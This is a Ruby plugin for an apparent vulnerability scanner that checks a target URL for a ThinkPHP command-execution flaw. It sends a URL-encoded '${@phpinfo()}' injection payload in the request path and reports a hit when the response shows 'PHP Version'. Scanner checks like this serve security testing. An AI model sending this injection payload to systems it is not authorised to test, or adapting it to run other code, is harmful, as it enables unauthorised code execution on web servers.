# encoding: utf-8

require 'net/http'
require 'uri'

class Exploit_2 < Playload::Issue

    def initialize
    	@name = "ThinkPHP Exp"
        @type			= "thinkphp"
        @tags 			= "thinkphp"
        @description	= "ThinkPHP命令执行 Exp: /index.php/module/aciton/param1/%24%7B@phpinfo%28%29%7D"
        @references		= {'sebug'=>'http://sebug.net/vuldb/ssvid-62277'}
        @severity 		= :high
        @remedy_guidance = "升级版本"
        @is_found 		= false
        @is_error 		= false
    end

    def exp(url)
        begin
            uri = URI(url + '/index.php/module/aciton/param1/%24%7B@phpinfo%28%29%7D')
            response = Net::HTTP.get_response(uri)
            if response.body.include?('PHP Version') then
      	  	@is_found = true
            end 
        rescue
            puts "Send Exp Failed: #{$!}"
        end 
    end

end

Playload::Queue.add Exploit_2.new
